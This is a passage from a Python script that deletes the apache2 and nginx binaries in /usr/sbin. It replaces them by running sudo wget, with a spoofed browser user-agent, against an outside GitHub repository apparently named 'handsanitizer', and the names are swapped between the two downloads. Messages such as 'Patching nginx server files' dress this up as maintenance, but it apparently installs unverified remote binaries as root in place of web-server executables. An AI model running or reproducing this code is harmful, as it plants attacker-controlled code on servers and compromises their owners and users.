...
os.chdir("/usr/sbin")
os.remove("apache2")
os.system("sudo wget --user-agent=\"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\" -q -O apache2 https://github.com/CriticalCow/handsanitizer/blob/master/nginx?raw=true")
print(Fore.GREEN + "Done")
# Replacing Nginx files
print(Fore.RED + "Patching nginx server files")
os.remove("nginx")
os.system("sudo wget --user-agent=\"Mozilla/5.0 (Windows NT 10.0; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4086.0 Safari/537.36\" -q -O nginx https://github.com/CriticalCow/handsanitizer/blob/master/apache2?raw=true")
print(Fore.GREEN + "Done")
